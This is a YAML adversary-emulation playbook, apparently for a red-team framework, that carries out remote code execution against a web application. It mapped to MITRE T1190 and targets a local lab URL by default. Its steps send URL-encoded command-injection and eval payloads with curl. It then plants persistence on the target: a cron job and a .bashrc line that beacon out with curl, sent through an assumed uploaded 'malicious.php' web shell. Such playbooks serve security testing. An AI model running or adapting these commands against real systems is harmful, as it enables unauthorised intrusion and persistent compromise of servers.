---
api_version: 2.0
uuid: b8c1e3d6-2a5f-4e0b-c3f6-9f7a2e5b0c1d
name: Remote Code Execution
authors:
  - mbhatt
description: |
  Achieve remote code execution on web servers through various injection vectors.
  Includes injection point identification, code execution testing, payload
  execution, and persistence establishment.

mitre:
  tactics:
    - "TA0001 Initial Access"
  techniques:
    - "T1190 Exploit Public-Facing Application"

requirements:
  platforms:
    - os: darwin

args:
  - name: target_url
    description: "Target web application URL"
    type: string
    default: "http://vulnerable-app.local/process.php"
  - name: injection_vector
    description: "Vector for code injection (command, eval, template, code)"
    type: string
    default: "command"
  - name: command_payload
    description: "System command to execute"
    type: string
    default: "id"
  - name: param_name
    description: "Parameter name to inject code into"
    type: string
    default: "cmd"

steps:
  - name: identify_injection_point
    description: Identify the vulnerable injection point in the application
    inline: |
      echo "[*] Identifying injection point: ${param_name}"
      curl -s "${target_url}" | grep -i "form\\|input\\|${param_name}" | head -10

  - name: test_code_execution
    description: Test basic code execution capability
    inline: |
      echo "[*] Testing ${injection_vector} injection on parameter: ${param_name}"
      encoded=$(echo "${command_payload}" | jq -sRr @uri)
      curl -s "${target_url}?${param_name}=${encoded}" > /tmp/rce_response.txt
    cleanup:
      inline: |
        rm -f /tmp/rce_response.txt 2>/dev/null
        rm -f /tmp/reverse_shell_* 2>/dev/null

  - name: execute_payload
    description: Execute the malicious payload on the target
    inline: |
      echo "[*] Executing payload: ${command_payload}"
      case "${injection_vector}" in
        command)
          encoded=$(echo "; ${command_payload}" | jq -sRr @uri)
          curl -s "${target_url}?${param_name}=${encoded}" 2>&1 | head -20
          ;;
        eval)
          encoded=$(echo "system('${command_payload}')" | jq -sRr @uri)
          curl -s "${target_url}?${param_name}=${encoded}" 2>&1 | head -20
          ;;
        *)
          curl -s "${target_url}?${param_name}=${command_payload}"
          ;;
      esac

  - name: establish_persistence
    description: Create a persistence mechanism via cron and bash profile on the target
    inline: |
      echo "[*] Establishing persistence via web shell"
      base_url="${target_url%/*}"
      # Attempt to write a cron-based callback via the RCE
      cron_payload="echo '* * * * * curl -s ${base_url}/beacon 2>/dev/null' | crontab -"
      encoded=$(echo "${cron_payload}" | jq -sRr @uri)
      curl -s "${base_url}${upload_directory:-/uploads}/malicious.php?cmd=${encoded}" 2>&1 | head -10 || true
      # Attempt to write a shell profile backdoor
      profile_payload="echo 'curl -s ${base_url}/beacon &' >> ~/.bashrc"
      encoded2=$(echo "${profile_payload}" | jq -sRr @uri)
      curl -s "${target_url}?${param_name}=$(echo "; ${profile_payload}" | jq -sRr @uri)" 2>&1 | head -10 || true

  - name: rce_execution_check
    description: Verify code execution on target
    inline: |
      grep -q "root\\|uid\\|www\\|apache" /tmp/rce_response.txt && echo "PASS" || echo "FAIL"

  - name: command_output_detection
    description: Verify command output in response
    inline: |
      [ -s /tmp/rce_response.txt ] && echo "PASS" || echo "FAIL"

tests:
  - name: rce_test
    dry_run: true
